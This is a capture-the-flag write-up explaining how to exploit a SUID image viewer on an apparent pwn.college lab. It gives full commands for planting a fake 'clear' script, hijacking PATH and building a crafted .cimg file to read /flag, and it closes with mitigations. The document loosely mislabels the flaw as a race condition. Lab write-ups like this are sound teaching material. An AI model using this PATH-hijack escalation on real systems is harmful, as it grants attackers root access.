# **Write-Up: Exploiting SUID Privilege Escalation in cimg Viewer**

## **Challenge Overview**
The challenge involves exploiting a custom image viewer (`/challenge/cimg`) that processes `.cimg` files. The binary has the **SUID bit set**, meaning it executes with root privileges regardless of who runs it. The vulnerability lies in **improper privilege management** in the `handle_6` function, allowing us to hijack a `system("clear")` call to read the protected `/flag` file.

---

## **Key Vulnerabilities**
1. **SUID Misconfiguration**  
   - The binary runs as root (`-rwsr-xr-x`), but drops privileges **after** calling `system("clear")`.
   - This creates a **race condition** where our malicious `clear` command executes with root privileges.

2. **Unsafe `system()` Call**  
   - `handle_6` calls `system("clear")` **before** dropping privileges (`setuid()`).
   - The command is resolved via `PATH`, which we control.

3. **Lack of Path Hardening**  
   - The program doesn’t use absolute paths (`/usr/bin/clear`), allowing `PATH` hijacking.

---

## **Exploit Strategy**
### **1. Hijack the `clear` Command**
Since `system("clear")` relies on the `PATH` environment variable, we:
1. Create a fake `clear` script in `/tmp/exploit`.
2. Prepend `/tmp/exploit` to `PATH` so our script executes instead of `/usr/bin/clear`.

### **2. Preserve Root Privileges**
The SUID binary runs our `clear` script **before** dropping privileges, giving it temporary root access to read `/flag`.

### **3. Bypass Permissions**
The fake `clear` script must be **executable** (`chmod 755`), or `system()` will ignore it.

---

## **Step-by-Step Exploit**
### **1. Prepare Malicious `clear` Command**
```bash
mkdir -p /tmp/exploit
echo -e '#!/bin/sh\ncat /flag' > /tmp/exploit/clear
chmod 755 /tmp/exploit/clear   # Critical: Must be executable!
```

### **2. Craft `.cimg` File to Trigger `handle_6`**
```python
import struct

with open("exploit.cimg", "wb") as f:
    f.write(
        b'cIMG' +                  # Magic header
        struct.pack('<H', 4) +     # Version 4
        struct.pack('BB', 1, 1) +  # Canvas dimensions (1x1)
        struct.pack('<I', 1) +     # 1 directive (handle_6)
        b'\x06\x00' +              # Directive 6 (handle_6)
        b'\x00'                    # Dummy byte
    )
```

### **3. Execute the Exploit**
```bash
export PATH=/tmp/exploit:$PATH  # Hijack PATH
/challenge/cimg exploit.cimg    # Runs with SUID root
```

**Expected Output:**  
The flag is printed:
```
pwn.college{flag}
```

---

## **Why This Worked**
1. **SUID Context**  
   - The binary runs as root, so `system("clear")` executes our payload with root privileges.

2. **PATH Manipulation**  
   - By prepending `/tmp/exploit` to `PATH`, we ensure our malicious `clear` runs instead of the system one.

3. **File Permissions**  
   - `chmod 755` ensures the fake `clear` is executable. Without this, `system()` would ignore it.

4. **Race Condition**  
   - `system()` is called **before** `setuid()`, so our payload runs before privileges drop.

---

## **Mitigations**
To prevent this attack:
1. **Drop Privileges Early**  
   Call `setuid()` **before** any `system()` or external command execution.

2. **Use Absolute Paths**  
   Replace `system("clear")` with `system("/usr/bin/clear")`.

3. **Sanitize Environment**  
   Reset `PATH` inside the program:
   ```c
   setenv("PATH", "/usr/bin:/bin", 1);
   ```

---

## **Key Takeaways**
1. **SUID binaries are dangerous** if privileges aren’t dropped correctly.
2. **`system()` is risky**—use `execve()` with full paths instead.
3. **Environment variables (`PATH`) are attacker-controlled**—always sanitize them.

This challenge demonstrates how **privilege management flaws** can lead to full system compromise. Well done on exploiting it! 🚩
